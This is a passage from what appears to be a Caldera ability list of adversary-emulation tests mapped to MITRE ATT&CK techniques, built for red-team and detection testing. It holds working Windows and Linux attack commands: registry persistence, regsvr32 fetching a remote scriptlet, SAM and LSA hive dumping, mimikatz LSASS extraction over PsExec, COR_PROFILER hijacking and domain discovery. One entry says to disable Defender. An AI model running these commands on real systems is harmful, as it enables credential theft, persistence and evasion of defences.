"atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "534ee0652aca292fc05421f6f429918b", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Reg Key RunOnce", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["aaaa08_T1218.009.cs"], "parsers": [], "cleanup": ["del %tmp%\\T1218.009.dll >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1218.009.dll\" /target:library aaaa08_T1218.009.cs && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1218.009.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm", "ability_id": "d3ddb9ff73f1927990c8286b6bf796e7", "technique_id": "T1218.009", "tactic": "defense-evasion", "requirements": [], "name": "Regasm Uninstall Method Call Test", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["8af345_Virtualbox_52.msi"], "parsers": [], "cleanup": ["sc stop VBoxDRV && sc delete VBoxDRV && regsvr32 /u /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && msiexec /x 8af345_Virtualbox_52.msi /qn"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver && regsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && rundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\" && sc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV && sc start VBoxDRV", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Run Virtual Instance", "ability_id": "015623df4f8517d933e4edd65deb97ed", "technique_id": "T1564.006", "tactic": "defense-evasion", "requirements": [], "name": "Register Portable Virtualbox", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "123d761fda64a5dd8535ac0ab95d4f25", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Register-CimProvider - Execute evil dll", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Audio Capture", "ability_id": "372e6f46fca18e4f1b43209c20ffafa2", "technique_id": "T1123", "tactic": "collection", "requirements": [], "name": "Registry artefact when application use microphone", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Video Capture", "ability_id": "da86001b5081fcf773d8e62f22cf2b00", "technique_id": "T1125", "tactic": "collection", "requirements": [], "name": "Registry artefact when application use webcam", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\sam >nul 2> nul && del %temp%\\system >nul 2> nul && del %temp%\\security >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg save HKLM\\sam %temp%\\sam && reg save HKLM\\system %temp%\\system && reg save HKLM\\security %temp%\\security", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "7fa4ea18694f2552547b65e23952cabb", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "Registry dump of SAM, creds, and secrets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore; Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"; New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Application Shimming", "ability_id": "ed65658e4431bc3b636dd0de29bf8e35", "technique_id": "T1546.011", "tactic": "multiple", "requirements": [], "name": "Registry key creation and/or modification events for SDB", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Parses registry hives to obtain stored credentials\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pypykatz live registry", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "0a154631923cfdbf2bc717716a9b75d8", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "Registry parse with pypykatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["83f016_T1574.012x64.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$env:COR_ENABLE_PROFILING = 0; $env:COR_PROFILER = ''; $env:COR_PROFILER_PATH = ''"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '83f016_T1574.012x64.dll'; POWERSHELL -c 'Start-Sleep 1'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: COR_PROFILER", "ability_id": "6149b491c05b505e56aa8ec9ef9c357a", "technique_id": "T1574.012", "tactic": "multiple", "requirements": [], "name": "Registry-free process scope COR_PROFILER", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["aaaa08_T1218.009.cs"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $Env:TEMP\\T1218.009.dll -ErrorAction Ignore | Out-Null; $parentpath = Split-Path -Path \"$Env:TEMP\\T1218.009.dll\"; Remove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null; Remove-Item $parentpath\\T1218.009.tlb -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; $Content = [System.Convert]::FromBase64String($key); Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1218.009.dll\" /target:library /keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm", "ability_id": "478df50001947bbbc38d109b90b1710e", "technique_id": "T1218.009", "tactic": "defense-evasion", "requirements": [], "name": "Regsvcs Uninstall Method Call Test", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["C:\\Windows\\system32\\regsvr32.exe /U /s %temp%\\shell32.jpg"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvr32", "ability_id": "61af21e36eb366eb7321e2a43053eeb1", "technique_id": "T1218.010", "tactic": "defense-evasion", "requirements": [], "name": "Regsvr32 Registering Non DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["bafdf3_AllTheThingsx86.dll"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\system32\\regsvr32.exe /s /i bafdf3_AllTheThingsx86.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvr32", "ability_id": "6b79b62b7bc6508698502e822ed01c79", "technique_id": "T1218.010", "tactic": "defense-evasion", "requirements": [], "name": "Regsvr32 Silent DLL Install Call DllRegisterServer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["4774cd_RegSvr32.sct"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:4774cd_RegSvr32.sct scrobj.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvr32", "ability_id": "d415783a94a4134fc3b5a99c531cbb74", "technique_id": "T1218.010", "tactic": "defense-evasion", "requirements": [], "name": "Regsvr32 local COM scriptlet execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["bafdf3_AllTheThingsx86.dll"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvr32", "ability_id": "6f2d3770ffae12e3cbeb0c49d9a700ad", "technique_id": "T1218.010", "tactic": "defense-evasion", "requirements": [], "name": "Regsvr32 local DLL execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Regsvr32", "ability_id": "c9bea46c8cb460a401d5167e9ee3bfe2", "technique_id": "T1218.010", "tactic": "defense-evasion", "requirements": [], "name": "Regsvr32 remote COM scriptlet execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Disable-PSRemoting -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Windows Remote Management", "ability_id": "7844eb9751d121b16f9517817a31eee4", "technique_id": "T1021.006", "tactic": "lateral-movement", "requirements": [], "name": "Remote Code Execution with PS Credentials Using Invoke-Command", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Ping a remote host to see if it is accessible", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.firewallping", "parserconfigs": [{"custom_parser_vals": {}, "edge": "isAccessibleFrom", "target": "", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "ping #{remote.host.fqdn}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "921055f4-5970-4707-909e-62f594234d91", "technique_id": "T1016", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn", "edge": "isAccessibleFrom"}], "module": "plugins.stockpile.app.requirements.not_exists"}], "name": "Remote Host Ping", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\PSTools\\PsExec.exe /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Process Injection", "ability_id": "b745ad6d82b54521c261f827005136e7", "technique_id": "T1055", "tactic": "multiple", "requirements": [], "name": "Remote Process Injection in LSASS via mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["411da5_AtomicService.exe"], "parsers": [], "cleanup": ["sc.exe \\\\localhost stop AtomicTestService_CMD >nul 2>&1 && sc.exe \\\\localhost delete AtomicTestService_CMD >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc.exe \\\\localhost create AtomicTestService_CMD binPath= 411da5_AtomicService.exe start=auto type=Own && sc.exe \\\\localhost start AtomicTestService_CMD", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Windows Service", "ability_id": "3c4593d39a3e5512b29fb37f2a463f16", "technique_id": "T1543.003", "tactic": "multiple", "requirements": [], "name": "Remote Service Installation CMD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "adidnsdump -u domain\\user -p password --print-zones 192.168.1.1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "4fffde1941bd17fed24ac68fd5e354aa", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - adidnsdump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "arp -a", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "a44bb43474728496276d5d73aa14588f", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - arp", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "ade7be51b815cbf8908ec931256374b6", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - arp nix", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip neighbour show", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "f489321f31b6ef36304294562d3d4645", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - ip neighbour", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the ip route command to display the kernels routing tables. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip route show", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "3c73b47eb1df2065b8f45449b754c859", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - ip route", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip tcp_metrics show |grep --invert-match \"^127\\.\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "d29305a9be37f6892e33f7ee7c06b880", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - ip tcp_metrics", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net view /domain && net view", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "f3c05269abfec53a1ea9b6d75dcce176", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - net", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net group \"Domain Computers\" /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "d8fedd81fc35099a5a3f1a8f5d2082dd", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - net group Domain Computers", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net group /domain \"Domain controllers\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "6f56fb95b173768d748414faf2db6588", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - net group Domain Controller", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain 